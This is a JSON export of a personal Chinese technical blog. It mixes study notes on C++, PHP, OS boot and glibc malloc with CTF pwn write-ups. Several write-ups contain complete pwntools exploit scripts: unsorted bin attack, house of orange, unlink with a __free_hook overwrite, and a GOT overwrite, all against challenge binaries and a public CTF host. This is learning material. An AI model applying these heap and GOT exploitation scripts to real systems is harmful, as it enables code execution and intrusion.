{"posts":[{"title":"C++学习","content":"由于最近学校开了数据结构，而且是以c++语言来描述，由于本菜鸡转专业并没有接触过c++，特此来补习一下，暂停PHP的学习。 #类 简单立方体类设计 #include &lt;iostream&gt; #include &lt;string&gt; using namespace std; class Cube{ private: int m_L; int m_H; int m_W; public: //设置长宽高 void set_L(int l) { m_L = l; } void set_H(int h) { m_H = h; } void set_W(int w) { m_W = w; } //获取长宽高 int get_L() { return m_L; } int get_H() { return m_H; } int get_W() { return m_W; } //获取面积 int get_area() { return 2 * (m_L * m_W + m_L * m_H + m_H * m_W); } //获取体积 int get_volume() { return m_W * m_L * m_H; } // 成员函数判断两个立方体是否相等 bool isSame(Cube &amp;c1) { if(m_H == c1.get_H() &amp;&amp; m_W == c1.get_W() &amp;&amp; m_L == c1.get_L()) { return true; } else return false; } }; //全局函数判断两个立方体是否相等 /* bool isSame(Cube &amp;c1,Cube &amp;c2) { if(c1.get_H() == c2.get_H() &amp;&amp; c1.get_W() == c2.get_W() &amp;&amp; c1.get_L() == c2.get_L()) { return true; } else return false; } */ int main(int argc, char const *argv[]) { Cube c1,c2; c1.set_W(10); c1.set_H(10); c1.set_L(10); c2.set_W(20); c2.set_L(20); c2.set_H(20); cout &lt;&lt; &quot;c1的长宽高为：&quot; &lt;&lt; c1.get_L() &lt;&lt; &quot;,&quot; &lt;&lt; c1.get_W() &lt;&lt; &quot;,&quot; &lt;&lt; c1.get_H() &lt;&lt; endl; cout &lt;&lt; &quot;c2的长宽高为：&quot; &lt;&lt; c2.get_L() &lt;&lt; &quot;,&quot; &lt;&lt; c2.get_W() &lt;&lt; &quot;,&quot; &lt;&lt; c2.get_H() &lt;&lt; endl; cout &lt;&lt; &quot;c1的面积和体积：&quot; &lt;&lt; c1.get_area() &lt;&lt; &quot;,&quot; &lt;&lt; c1.get_volume() &lt;&lt; endl; /* bool is_s = isSame(c1,c2); if(is_s == true) cout &lt;&lt; &quot;c1和c2相等&quot; &lt;&lt; endl; else cout &lt;&lt; &quot;c1和c2不相等&quot; &lt;&lt; endl; */ bool is_s = c1.isSame(c2); if(is_s == true) cout &lt;&lt; &quot;c1和c2相等&quot; &lt;&lt; endl; else cout &lt;&lt; &quot;c1和c2不相等&quot; &lt;&lt; endl; return 0; } ","link":"https://l3mon629.github.io/post/cxue-xi/"},{"title":"unsorted bin attack","content":"简单说明 基本来源 当一个较大的 chunk 被分割成两半后，如果剩下的部分大于 MINSIZE，就会被放到 unsorted bin 中。 释放一个不属于 fast bin 的 chunk，并且该 chunk 不和 top chunk 紧邻时，该 chunk 会被首先放到 unsorted bin 中。 当进行 malloc_consolidate 时，可能会把合并后的 chunk 放到 unsorted bin 中，如果不是和 top chunk 近邻的话。 利用方法： 改unsorted bin 的bk为target-0x10 实现效果： 将target改为一个很大的数值 利用场景： 修改循环的次数来使得程序可以执行多次循环。 修改 heap 中的 global_max_fast 来使得更大的 chunk 可以被视为 fast bin。 改_IO_list_all来伪造_IO_FILE进行攻击。 hitcontraining_lab14 题目的edit功能可以改size，实现一个强力的堆溢出，同时题目存在后门，只要改一个bss段的变量大于即可cat flag 思路很简单，堆溢出打掉unsorted bin的bk，连libc都不用泄漏 exp: from pwn import * p = process('./magicheap') def add(size,content): p.sendlineafter('Your choice :','1') p.sendlineafter('Size of Heap :',str(size)) p.sendafter('Content of heap:',content) def edit(index,size,content): p.sendlineafter('Your choice :','2') p.sendlineafter('Index :',str(index)) p.sendlineafter('Size of Heap :',str(size)) p.sendafter('Content of heap :',content) def delete(index): p.sendlineafter('Your choice :','3') p.sendlineafter('Index :',str(index)) add(0x10,'aaaa') add(0x90,'aaaa') add(0x10,'protect') context.log_level = 'debug' target = 0x6020C0 delete(1) payload = p64(0) * 3 + p64(0xa1) + p64(0) + p64(target-0x10) edit(0,0x40,payload) add(0x90,'a') p.recv() p.send('4869') p.interactive() ","link":"https://l3mon629.github.io/post/unsorted-bin-attack/"},{"title":"house of orange学习","content":"house of orange 什么时候用？ 当程序不提供free功能的时候我们选择采用house of orange攻击手法 作用：经过攻击后得到一个unsorted bin 仔细回想一下自己所学，在stack中，大部分攻击手法都类似于栈溢出，目的是为了控制ret的返回地址 在heap中的攻击手法多样，不仅有溢出还有很多攻击手法，但是大多数目的只有一个：控制指针。而free态的堆块天然的给我们提供了一些指针，fastbin的fd，unsorted bin的fd和bk等等等等。通过控制指针，我们可以泄漏内存，可以改写内存，相当于控制了程序的执行流。 我们来看一下这个过程的详细情况，我们假设目前的 top chunk 已经不满足 malloc 的分配需求。 首先我们在程序中的malloc调用会执行到 libc.so 的_int_malloc函数中，在_int_malloc函数中，会依次检验 fastbin、small bins、unsorted bin、large bins 是否可以满足分配要求，因为尺寸问题这些都不符合。接下来_int_malloc函数会试图使用 top chunk，在这里 top chunk 也不能满足分配的要求，此时 ptmalloc 已经不能满足用户申请堆内存的操作，需要执行 sysmalloc 来向系统申请更多的空间。 但是对于堆来说有 mmap 和 brk 两种分配方式，我们需要让堆以 brk 的形式拓展，之后原有的 top chunk 会被置于 unsorted bin 中。 这样我们就得到了一个unsorted bin 不过，我们得满足一些要求： 1，伪造的 size 必须要对齐到内存页 2，size 要大于 MINSIZE(0x10) 3，size 要小于之后申请的 chunk size + MINSIZE(0x10) 4，size 的 prev inuse 位必须为 1 BookWriter 逆向分析 main函数 read_author函数 add函数，请记住这个count在这里&gt;8 show函数，到了这里，变成数量&gt;7了 edit函数，很诡异的发现有个strlen，存在无00截断漏洞，并且堆块数量&gt;7 edit author函数，同样，框起来的地方也存在无00截断漏洞 bss段上，发现author,heaparray,sizearray是连在一起的 思路 总结一下发现的漏洞点： 1，strlen和printf(&quot;%s&quot;)的无00截断的漏洞 2，add函数和show，edit函数中的关于堆块数量的逻辑漏洞 这两个漏洞可以做到什么呢？ 首先：第一个strlen，如果我们申请0x18的堆块，并且填满所有内容，那么下面的内存布局不是\\x00，而是下一个堆块的size，由于不为空，下面的这一条语句，使得我们的size_array的某一个元素扩大，可以实现少量字节的堆溢出 size_array[v1] = strlen(heap_array[v1]); 第二：printf(&quot;%s&quot;)无00截断，由于author就在heaparray的上方，我们同样的填满author中的内容，可以泄漏出第一个堆块即heaparray[0]的地址 第三：由于add函数中存在count可以多申请一个，即在add函数里面我们可以申请0-8共九个堆块，但是heaparray的大小是8，所以我们的第九个堆块的地址会被记录在sizearray里面，造成了一个威力极大的堆溢出 总思路：利用house of orange得到一个unsorted bin，由于edit author的存在使bss段可写，我们便可以在bss段上伪造一个size能够覆盖heaparray的unsorted bin，然后申请过来，便可以控制heaparray，然后打__malloc_hook 利用漏洞一，我们可以改写topchunk的size，然后申请一个比topchunk大的堆块，实现house of orange，得到一个unsorted bin，然后申请一个小chunk，由于是从unsorted bin里面切下来的，我们就可以show这个小chunk来泄漏libc基址 利用漏洞三，我们申请九次chunk，可以获得一个超大溢出的能力，溢出到unsorted bin（原先的top chunk），然后改写fd和bk，使得真unsorted bin位于队列的前一个位置 利用编辑作者和漏洞二的功能，在bss段伪造一个unsorted bin，同时设置好fd和bk。借助漏洞二可以泄漏heap[0]的基地址，可以辅助来设置fd和bk(当然，设置成main_arena+88也可以，只要设置heap段的那个unsorted bin里面的bk为伪造的unsorted bin即可) 再次利用漏洞一，为了能够再次申请chunk，我们利用编辑功能，编辑0号chunk，的第一个内容为\\x00，这样可以欺骗strlen，将sizearray[0]即heaparray[8]设置为0，我们获得无限申请堆块的能力 申请合适大小的堆块，使得fake unsorted bin脱链，使我们获得在bss段上写入的能力。 写入payload，控制heaparray，攻击__malloc_hook为system地址 exp from pwn import * local = 1 if local == 1: p = process('./bookwriter') else: p = remote('chall.pwnable.tw',10304) elf = ELF('./bookwriter') libc = ELF('./libc-2.23.so') def dbg(): context.log_level = 'debug' def author(name): p.sendafter('Author :',name) def add(size,content): p.sendlineafter('Your choice :','1') p.sendlineafter('Size of page :',str(size)) p.sendafter('Content :',content) def show(index): p.sendlineafter('Your choice :','2') p.sendlineafter('Index of page :',str(index)) def edit(index,content): p.sendlineafter('Your choice :','3') p.sendlineafter('Index of page :',str(index)) #p.sendafter('Content :',content) p.recvuntil('Content:') p.send(content) def edit_author(main_arena_88): p.sendlineafter('Your choice :','4') p.recvuntil('Author :') p.recvuntil(b'A' * 64) leak_heap = u64(p.recvuntil('\\x0a',drop = True)[-4:].ljust(8,b'\\x00')) p.sendlineafter('Do you want to change the author ? (yes:1 / no:0)','1') payload = b'/bin/sh\\x00'+p64(0x111)+p64(leak_heap+0x130)+p64(main_arena_88)+p64(0)*4 p.sendafter('Author :',payload) return leak_heap print(&quot;============ bss ============ &quot;) print(&quot;[*] the 'author' is in 0x602060 &quot;) print(&quot;[*] heaparray[] is in 0x6020A0&quot;) print(&quot;[*] sizearray[] is in 0x6020E0&quot;) print(&quot;============ bss ============ &quot;) author(b'A' * 64) add(0x18,b'A' * 0x18) #0 print(&quot;now we still don't use the fun 'edit',so we dont't use strlen&quot;) print(&quot;the next,we use strlen&quot;) #dbg() print(&quot;========= step 1: make top chunk into unsorted bin ============ &quot;) edit(0,b'A' * 0x18) print(&quot;Now, we successfully have haven 3 bytes to overflow&quot;) #dbg() payload = b'\\x00' * 0x18 + b'\\xe1\\x0f\\x00' edit(0,payload) context.log_level = 'info' add(0x1fe1,'A') #1 print(&quot;======== step 2: leak libc address and the heap address =========== &quot;) add(0x10,'A') #2 show(2) #main_arena = u64(p.recvuntil('\\x7f')[-6:].ljust(8,b'\\x00')) - 1569 #print('main_arena leak ---&gt; ' + hex(main_arena)) #p.recv() libc_base = u64(p.recvuntil('\\x7f')[-6:].ljust(8,b'\\x00')) - 0x39c141 #- 88 - 0x10 - libc.sym['__malloc_hook'] print('[*] libc_base ----&gt; ',hex(libc_base)) for i in range(6): add(0x10,'A') main_arena_88 = libc_base + 0x39bb78 print(&quot;forge unsorted bin in author(bss) to control the heaparray &quot;) heap_addr = edit_author(main_arena_88) print('[*] the heaparray[0] ------&gt; ',hex(heap_addr)) print(&quot;=========== step 3: control the heaparray ============ &quot;) print(&quot;to emptify the heaparray[8] (sizearray[0]) ,so we can continue to malloc &quot;) edit(0,p64(0)) #dbg() add(0x30,'AAAAAAAA') author_fake_unsorted_bin = 0x602060 payload = 0x130 * b'\\x00' + p64(0) + p64(0x21) + p64(main_arena_88) + p64(author_fake_unsorted_bin) edit(0,payload) __malloc_hook = main_arena_88 - 88 -0x10 system_addr = libc_base + 0x3f550 add(0x100,48*b'a' + p64(__malloc_hook - 8)) edit(0,p64(0) + p64(system_addr)) p.recvuntil('Your choice :') p.sendline('1') p.recvuntil('Size of page :') p.sendline(str(author_fake_unsorted_bin)) p.interactive() 收获几个点： 1，一个chunk放入unsorted bin链时将该堆块插入链表头，而从这个链取堆块的时候是从尾部开始的，因此unsorted bin遍历堆块的时候使用的是bk指针。 2，malloc过程复习 #include &lt;stdio.h&gt; #include &lt;stdlib.h&gt; int main() { void *p,*q; p = malloc(0x1000); malloc(0x10); q = malloc(0x800); malloc(0x20); free(p); free(q); malloc(0x500); malloc(0x500); } 过程分析：执行完free后p和q都在unsorted bin里，p是头部，q是尾部。 malloc(0x500)时，unsorted bin从q开始遍历，将q和p放到large bins里，然后从large bins里切割q，将剩下的部分再次链入unsorted bin。此时p在large bins，q在unsorted bin。 再次malloc(0x500)时，unsorted bin开始遍历，q不满足要求，被放入small bins，p满足，切割后被放入unsorted bin里，所以最终结果是p在unsorted bin，q在small bins里。 3，关于题目的一些tips，不泄漏堆地址也可以，我们只需要将real unsorted bin的bk改为fake unsorted bin的地址就可以了。 关于__malloc_hook，其实一开始不太理解为什么__malloc_hook可以改为system拿shell，翻了一下源码发现__malloc_hook其实是有参数的，第一个参数是size，第二个参数是指针。但是并没有审到什么时候调用这两个参数，在exp中，我们最后利用__malloc_hook(address)，__malloc_hook的地址被改成了system，address指向的内容是/bin/sh，具体malloc的时候，address是作为size传进去的。个人猜测这个方法不常见的原因大概是大多数的题目对malloc的size是有界限的，不允许malloc大size(address一般都是非常大的值) 参考链接： 深入理解unsorted bin attack：https://xz.aliyun.com/t/7251 glibc源码：https://code.woboq.org/userspace/glibc/malloc/malloc.c.html#3034 ctf-wiki：https://ctf-wiki.github.io/ctf-wiki/pwn/linux/glibc-heap/house_of_orange-zh/ ","link":"https://l3mon629.github.io/post/house-of-orange-xue-xi/"},{"title":"操作系统","content":" 说明：本课程为哈尔滨工业大学李治军老师所开公开课，本文仅作笔记，供复习学习使用 代码部分采用Linux 0.11部分内核代码，实验部分采用实验楼的实验 揭开钢琴的盖子 初始化 打开电源后发生了什么？ 关注ip指针指向的内容，这部分显然由硬件的设计者来决定 x86PC 刚开机的时候cpu处于实模式，按照实模式来寻址，cs左移四位+ip 开机时，CS = 0xFFFF IP = 0x0000 寻址到0xFFFF0，为ROM BIOS映射区（BIOS = basic input output system） 检查RAM，键盘，显示器和软硬磁盘等 将0磁道0扇区读入0x7c00处 设置CS = 0x07c0 IP=0x0000 0x7c00处存放的代码就是从引导扇区读入的那512个字节 bootsec.s 第一部分：将自身，即bootsec由段0x07c0移动到段0x9000，共计256个字，然后跳转到go标号处，即下一条指令继续执行 第二部分：利用BIOS中断INT 0x13将setup模块从磁盘第二个扇区开始读到0x90200处，共读四个扇区 第三部分：setup模块读入后 显示字符信息 操作系统启动 setup.s 第一部分：移动system模块 第二部分：启动保护模式 gdt：global description table 保护模式下的寻址模式：根据cs查表+ip 将system移动到0x0000处 第三部分：跳转到system去执行 ","link":"https://l3mon629.github.io/post/cao-zuo-xi-tong/"},{"title":"[BJDCTF 2nd]pwn题目全解","content":"[BJDCTF 2nd]rci 很不错的题目 不需要写exp，直接nc做就行了 逆向分析 main函数，有一个init函数，我们进去看看 在init函数里面，程序首先到/tmp文件夹下面新建了若干文件夹，然后随机选一个文件夹进入，记为“藏有imagin”的文件夹，然后提示我们获得道具ls 在下面我们可以向command写入东西，然后system(command)，但是之前有一个检查check1 我们只能输入a-z和A-Z和“/” “ ” “-”三个特殊字符 接下来是特殊的知识点了，题目考我们关于linux的熟悉度 inode 理解inode，要从文件储存说起。 文件存储在硬盘上，硬盘的最小存储单位叫做“扇区”（Sector）。每个扇区储存512字节（相当于0.5KB）。 操作系统读取硬盘的时候，不会一个个扇区的读取，这样效率太低，而是一次性连续读取多个扇区，即一次性读取一个“块”（block）。这种由多个扇区组成的“块”，是文件存取的最小单位。“块”的大小，最常见的是4KB，即连续八个sector组成一个block。 文件数据都储存在“块”中，那么很显然，我们还必须找到一个地方储存文件的“元信息”，比如文件的创建者、文件的创建日期、文件的大小等等。这种储存文件元信息的区域就叫做inode，中文译名为&quot;索引节点&quot;。 每一个文件都有对应的inode，里面包含了与该文件有关的一些信息。 万物皆文件，文件夹也有其对应的inode号，我们可以通过ls -i查看inode号码 我们开两个shell，然后一个输入 ls -ali 查看当前目录下的inode，然后再另外一个输入ls -ali /tmp，就可以查看tmp文件夹下的inode号，如下图 然后两个inode号相同的就是我们当前所在目录 可以看到我们获得残缺的shell 有个check2进行检查 两种绕过方法，一个是用拼接符&quot;``&quot;,可以拿shell 第二个是用$0来绕过 ","link":"https://l3mon629.github.io/post/bjdctf-2ndpwn-ti-mu-quan-jie/"},{"title":"buu-pwn(2)","content":"picoctf_2018_got_shell 有意思的题目，也不难，理清楚逻辑就能出 main函数，逻辑是输入一个地址v3存入s 然后输入v4，将v3和v4都输入s 然后v3的值被赋值给v4的地址 程序本身有后门 我们只需要把v3赋值给puts@got，然后把v4的地址赋值给后门地址 然后调用puts的时候，就会调用后门，然后拿到shell exp from pwn import * local = 0 if local == 1: p = process('./PicoCTF_2018_got-shell') else: p = remote('node3.buuoj.cn',28761) elf = ELF('./PicoCTF_2018_got-shell') #libc = ELF('./libc.so.6') def dbg(): context.log_level = 'debug' p.recvuntil('I\\'ll let you write one 4 byte value to memory. Where would you like to write this 4 byte value?\\n') payload = hex(elf.got['puts']) p.sendline(payload) backdoor = int(0x0804854B) payload = hex(backdoor) p.sendline(payload) p.interactive() ","link":"https://l3mon629.github.io/post/buu-pwn2/"},{"title":"axb_2019_heap","content":"发现一个很有意思的题目，学到了一些东西，特此记录一下 逆向 main函数： 在format_string里面有格式化字符串漏洞 add函数： 很长，大体意思就是bss段上有一个key，如果key == 43，就可以申请fastbin大小的chunk，否则不可以 get_input里面存在off-by-one漏洞，别的函数就不看了，节省时间 思路 这个题目在bss上是有heaparray的，但是保护全开，有个format string漏洞 思路就出来了，我们可以利用格式化字符串泄漏相关地址，然后实施unlink攻击 我们调试一下，直接定位到printf的位置单步调试 注意，调试格式化字符串漏洞的时候一定要进入到输入点之前才能确定栈上的位置 tips：在pwndbg里面我们可以利用命令fmtarg来确定是格式化字符串的第几个参数 fmtarg 0x7ffdb76453e8 main+28的地方发现是第十一个参数，__libc_start_main+20的地方发现是第十五个参数 但是注意，我们在打格式化的时候，%11p只是取栈的地址，要想取栈地址里面存的值要用$p 利用main+28可以泄漏出heaparray的地址，具体做法如下 .text:000000000000116A .text:000000000000116A ; int __cdecl main(int argc, const char **argv, const char **envp) .text:000000000000116A public main .text:000000000000116A main proc near ; DATA XREF: _start+1D↑o .text:000000000000116A 可以看到在开启pie的情况下main的相对加载位置在0x116A处 .bss:0000000000202060 public note .bss:0000000000202060 note db ? ; ; DATA XREF: add_note+DA↑o .bss:0000000000202060 ; add_note+F4↑o ... heaparray位于0x202060处，所以heaparray在被加载进内存的地址就等于(main+28)-28-0x116A+0x202060的地址 利用__libc_start_main来泄漏libc的地址 思路就是申请三个chunk，然后利用off-by-one溢出一个字节unlink到heaparray，然后改写__free_hook为system 为什么不改写__malloc_hook呢？？因为程序内部存在检查，如果改写malloc相关的函数会报出&quot;no hacker&quot;之类的字符串 为什么不改写free呢？？因为调试发现会crash掉 tips：unlink的时候注意 chunk0 chunk1 chunk2 我们通常是先构造fakechunk，然后free(1)，但是我们伪造的fd和bk注意是heaparray[0] - 0x18和0x10的位置 本地能打通，远程一直报timeout的错误，用别人的脚本也这样，愁人 exp from pwn import * local = 0 if local == 1: p = process('./axb_2019_heap') else: p = remote('node3.buuoj.cn',28566) elf = ELF('./axb_2019_heap') libc = ELF('./libc.so.6') def dbg(): context.log_level = 'debug' def fmt(name): p.recvuntil('Enter your name:') p.sendline(name) def add(index,size,content): p.sendlineafter('&gt;&gt; ','1') p.sendlineafter('Enter the index you want to create (0-10):',str(index)) p.sendlineafter('Enter a size:',str(size)) p.sendlineafter('Enter the content:',content) def free(index): p.sendlineafter('&gt;&gt; ','2') p.sendlineafter('Enter an index:',str(index)) def edit(index,content): p.sendlineafter('&gt;&gt; ','4') p.sendlineafter('Enter an index:',str(index)) p.sendafter('Enter the content:',content) #dbg() print(&quot;======= step 1 : by use fmtstr leak address libc + bss =======&quot;) fmt('%11$p%15$p') p.recvuntil('Hello,') main = int(p.recv(15),16) - 28 __libc_start_main = int(p.recv(15),16) - 240 print(&quot;main ---&gt; &quot; + hex(main)) print(&quot;__libc_start_main ----&gt; &quot; + hex(__libc_start_main)) heaparray = main - 0x116A + 0x202060 print(&quot;heaparray in bss(DATA) ----&gt; &quot; + hex(heaparray)) libc_base = __libc_start_main - libc.sym['__libc_start_main'] print(&quot;libc base ----&gt;&quot; + hex(libc_base)) add(0,0x98,'A') #chunk0 add(1,0xa0,'B') #chunk1 add(2,0x90,'/bin/sh\\x00') #chunk2 print(&quot;======== step 2: unlink =========&quot;) fd = heaparray - 0x18 bk = heaparray - 0x10 chunk0 = p64(0) + p64(0x91) + p64(fd) + p64(bk) +p64(0) * 14 + p64(0x90) + p64(0xb0) edit(0,chunk0) free(1) print(&quot;======= step 3: attack __free_hook ======&quot;) free = libc_base + libc.symbols['__free_hook'] system = libc_base + libc.symbols['system'] payload = p64(0) * 3 + p64(free) + p64(0x8) + b'\\n' print(&quot;这里写入8是因为我们要在bss上伪造chunksize，我们需要写入8字节的payload，即下文的p64(system)&quot;) edit(0,payload) payload = p64(system) print(hex(system)) #dbg() edit(0,payload) p.sendline('2') p.sendline('2') p.interactive() ","link":"https://l3mon629.github.io/post/axb_2019_heap/"},{"title":"PHP面向对象学习","content":"面向对象基础 面向对象的关键字说明 面向对象关键字：基于面向对象开发时，所用到的一些关键字，用来表明一些结构和类型 类：定义面向对象主体的最外层结构，包裹主体的数据和功能，共性事物的代表 对象：是某类事物的具体代表，是实际数据和功能操作的具体单元，也被称之为实例 实例化：new，从一个抽象的概念得到符合抽象概念的具体实例的过程 类成员：member，指类class中的所有内容，类成员有三种 属性：在class中创建的变量 方法：class结构中创建的函数 类常量：const，在class中创建的常量 面向对象简单技术实现 class 声名 类 类名：驼峰命名 大括号：只有在大括号里面的东西才是类成员，大括号里面的大括号不算 class name{ } 实例化：产生对象 new 类名; new 类名(); #较多 对象：一般用变量保存 $object = new classname(); 步骤：1，根据需求产生类的结构 2，需要使用时实例化 demo &lt;?php class Nothing{ } $nothing = new Nothing(); var_dump($nothing); 运行结果 类成员 属性和方法需要使用访问修饰限定修饰符，暂时使用public 成员访问：属性和方法都属于对象访问，类常量属于类访问 对象访问属性和方法，使用-&gt; 自己简单写个例子好了 &lt;?php class Student{ const STUDENT_NUMBER = 27; public $name; public $number; public $sex; public function print(){ echo __CLASS__; #魔术方法，打印类名 } } 成员访问方法：必须通过对象访问 属性访问：增删改查 &lt;?php class Student{ const STUDENT_NUMBER = 27; public $name; public $number; public $sex; public function print(){ echo &quot;\\n&quot;.__CLASS__; #魔术方法，打印类名 } } $stu = new Student(); #增 $stu -&gt; tall; $stu -&gt; height = 180; #删除 unset($stu -&gt; number); #改 $stu -&gt; name = &quot;Tom&quot;; #查 var_dump($stu -&gt; name); echo &quot;\\n&quot;; var_dump($stu); 运行情况 访问方法 $stu -&gt; print(); 打印出来类的名字 通常，我们访问属性，只用改和查就够了 访问修饰限定符 概念 访问修饰限定符：用在属性或者方法前修饰的关键字，是用来控制属性或者方法的访问位置 分类 public，公有，类内类外都可 protected，受保护，只允许在相关类内部访问 private，私有，只允许在定义类内部访问 方法可以没有没有修饰限定符，默认public 类内部对象 概念 $this 方法内部内置的一个对象，会自动指向来调用方法的对象 步骤 1，声明类结构 2，明确私有成员，不限定成员的访问限定修饰符 3，私有成员需要在某种情况下被访问：增加方法，在方法里使用$this访问 直接看代码好了 &lt;?php class Saler{ public $count = 100; public function getV(){ echo $count; //会报错，提示未定义变量 } } $s = new Saler(); $s -&gt; getV(); &lt;?php class Saler{ public $count = 100; public function getV(){ var_dump($this); echo &quot;&lt;br&gt;&quot; . $this -&gt; count; } } $s = new Saler(); $s -&gt; getV(); 运行结果 注意，$this对象是在类内部访问的，因此可以访问类的所有的属性和方法，不受访问修饰限定符的限制 thisclass和new的关系原理class:定义类结构，属于非执行段代码，因此会被加载到代码段（编译）new:实例化对象，先判定类在内存里是否存在。不存在报错。若存在，则将类内部的属性复制一份，然后在内存（heap）开辟一块内存空间，将属性放到里面，同时内部有一个指针指向类的内存空间对象访问属性即访问的是对象空间里存储的部分，对象访问方法是通过内部指针找到类空间中的方法，然后再内存（栈）开辟运行this class和new的关系原理 class:定义类结构，属于非执行段代码，因此会被加载到代码段（编译） new:实例化对象，先判定类在内存里是否存在。不存在报错。若存在，则将类内部的属性复制一份，然后在内存（heap）开辟一块内存空间，将属性放到里面，同时内部有一个指针指向类的内存空间 对象访问属性即访问的是对象空间里存储的部分，对象访问方法是通过内部指针找到类空间中的方法，然后再内存（栈）开辟运行 thisclass和new的关系原理class:定义类结构，属于非执行段代码，因此会被加载到代码段（编译）new:实例化对象，先判定类在内存里是否存在。不存在报错。若存在，则将类内部的属性复制一份，然后在内存（heap）开辟一块内存空间，将属性放到里面，同时内部有一个指针指向类的内存空间对象访问属性即访问的是对象空间里存储的部分，对象访问方法是通过内部指针找到类空间中的方法，然后再内存（栈）开辟运行this:是系统在方法内置的对象通用名字，对象在调用方法的时候，系统会自动找到对象所保存的内存地址（heap）然后把地址赋给this 本质：局部变量 ","link":"https://l3mon629.github.io/post/php-mian-xiang-dui-xiang-xue-xi/"},{"title":"glibc源码学习","content":"主要探究一下malloc和free是如何执行的 !!!说明：本文是杂文，可能只有我能看懂，仅供复习参考使用，不定期更新 malloc 真正发挥作用的是_int_malloc 但是call malloc是__libc_malloc 在__libc_malloc中会调用_int_malloc 整个heap的信息都记录在struct malloc_state中，称为main_arena __libc_malloc主体部分如下 hook取得__malloc_hook部分内容 如果指针hook != 0 就调用hook函数 (第一次调用malloc时，__malloc_hook里面其实是有一个叫malloc_hook_ini的函数，该函数首先把__mallochook置0防止再次调用（因为返回地址是__libc_malloc，然后调用了ptmalloc_init()这个做初始化工作的主体函数) void * __libc_malloc (size_t bytes) { mstate ar_ptr; void *victim; void *(*hook) (size_t, const void *) = atomic_forced_read (__malloc_hook); if (__builtin_expect (hook != NULL, 0)) return (*hook)(bytes, RETURN_ADDRESS (0)); arena_get (ar_ptr, bytes); victim = _int_malloc (ar_ptr, bytes); /* Retry with another arena only if we were able to find a usable arena before. */ if (!victim &amp;&amp; ar_ptr != NULL) { LIBC_PROBE (memory_malloc_retry, 1, bytes); ar_ptr = arena_get_retry (ar_ptr, bytes); victim = _int_malloc (ar_ptr, bytes); } if (ar_ptr != NULL) __libc_lock_unlock (ar_ptr-&gt;mutex); assert (!victim || chunk_is_mmapped (mem2chunk (victim)) || ar_ptr == arena_for_chunk (mem2chunk (victim))); return victim; } 点进去arena_get /* arena_get() acquires an arena and locks the corresponding mutex. First, try the one last locked successfully by this thread. (This is the common case and handled with a macro for speed.) Then, loop once over the circularly linked list of arenas. If no arena is readily available, create a new one. In this latter case, `size' is just a hint as to how much memory will be required immediately in the new arena. */ #define arena_get(ptr, size) do { \\ ptr = thread_arena; \\ arena_lock (ptr, size); \\ } while (0) 我们直接上手跟踪好了 #Include &lt;stdio.h&gt; #include &lt;stdlib.h&gt; int main() { void *p,*q; p = malloc(100); q = malloc(16); return 0; } 可以看到，第一次调用malloc时，会进去malloc_hook_ini函数 执行完后返回到__libc_malloc函数里面 free 我们通过这个demo看一下free过程中发生了啥 #include &lt;stdio.h&gt; #include &lt;stdio.h&gt; #include &lt;string.h&gt; int main() { void *p,*q,*r; p = malloc(150); q = malloc(150); r = malloc(150); free(p); free(r); free(q); } 如图，我们现在申请了三个chunk free掉一块，可以看到进入unsorted bin中去 把r free掉，可以看到直接和top chunk合并了 思考：如果free q后，是q先和p合并呢还是先和topchunk合并呢？？ 调试小技巧 可以看到，其实是先和前一块chunk进行合并的 size加上prevsize之类的 小技巧，p *(struct malloc_state*)address可以将某个地址的堆块详细信息打印出来 可以看到，最终三个chunk都被top chunk合并起来 ","link":"https://l3mon629.github.io/post/glibc-yuan-ma-xue-xi/"},{"title":"ctfwiki-unlink—2014 HITCON stkof","content":"通过这个题目再来学习下unlink 逆向 main函数，一样是个菜单题，但是比较坑的是没给菜单，只能靠用户来逆向出其功能 __int64 __fastcall main(__int64 a1, char **a2, char **a3) { int index; // eax signed int v5; // [rsp+Ch] [rbp-74h] char nptr; // [rsp+10h] [rbp-70h] unsigned __int64 v7; // [rsp+78h] [rbp-8h] v7 = __readfsqword(0x28u); alarm(0x78u); while ( fgets(&amp;nptr, 10, stdin) ) { index = atoi(&amp;nptr); if ( index == 2 ) { v5 = sub_4009E8(); goto LABEL_14; } if ( index &gt; 2 ) { if ( index == 3 ) { v5 = sub_400B07(); goto LABEL_14; } if ( index == 4 ) { v5 = sub_400BA9(); goto LABEL_14; } } else if ( index == 1 ) { v5 = sub_400936(); goto LABEL_14; } v5 = -1; LABEL_14: if ( v5 ) puts(&quot;FAIL&quot;); else puts(&quot;OK&quot;); fflush(stdout); } return 0LL; } add堆块功能： 其中heaparray在0x602140处 signed __int64 sub_400936() { __int64 size; // [rsp+0h] [rbp-80h] char *mem_ptr; // [rsp+8h] [rbp-78h] char s; // [rsp+10h] [rbp-70h] unsigned __int64 v4; // [rsp+78h] [rbp-8h] v4 = __readfsqword(0x28u); fgets(&amp;s, 16, stdin); size = atoll(&amp;s); mem_ptr = (char *)malloc(size); if ( !mem_ptr ) return 0xFFFFFFFFLL; ::s[++dword_602100] = mem_ptr; printf(&quot;%d\\n&quot;, (unsigned int)dword_602100, size); return 0LL; } free： no UAF signed __int64 sub_400B07() { unsigned int v1; // [rsp+Ch] [rbp-74h] char s; // [rsp+10h] [rbp-70h] unsigned __int64 v3; // [rsp+78h] [rbp-8h] v3 = __readfsqword(0x28u); fgets(&amp;s, 16, stdin); v1 = atol(&amp;s); if ( v1 &gt; 0x100000 ) return 0xFFFFFFFFLL; if ( !::s[v1] ) return 0xFFFFFFFFLL; free(::s[v1]); ::s[v1] = 0LL; return 0LL; } edit:可以任意修改堆块size，造成任意堆溢出 signed __int64 sub_4009E8() { signed __int64 result; // rax int i; // eax unsigned int index; // [rsp+8h] [rbp-88h] __int64 size; // [rsp+10h] [rbp-80h] char *ptr; // [rsp+18h] [rbp-78h] char s; // [rsp+20h] [rbp-70h] unsigned __int64 v6; // [rsp+88h] [rbp-8h] v6 = __readfsqword(0x28u); fgets(&amp;s, 16, stdin); index = atol(&amp;s); if ( index &gt; 0x100000 ) return 0xFFFFFFFFLL; if ( !::s[index] ) return 0xFFFFFFFFLL; fgets(&amp;s, 16, stdin); size = atoll(&amp;s); ptr = ::s[index]; for ( i = fread(ptr, 1uLL, size, stdin); i &gt; 0; i = fread(ptr, 1uLL, size, stdin) ) { ptr += i; size -= i; } if ( size ) result = 0xFFFFFFFFLL; else result = 0LL; return result; } IO 缓冲区问题分析 值得注意的是，由于程序本身没有进行 setbuf 操作，所以在执行输入输出操作的时候会申请缓冲区。这里经过测试，会申请两个缓冲区，分别大小为 1024 和 1024。具体如下，可以进行调试查看 初次调用 fgets 时，malloc 会分配缓冲区 1024 大小。 别管我说的啥，调试就完了 exp 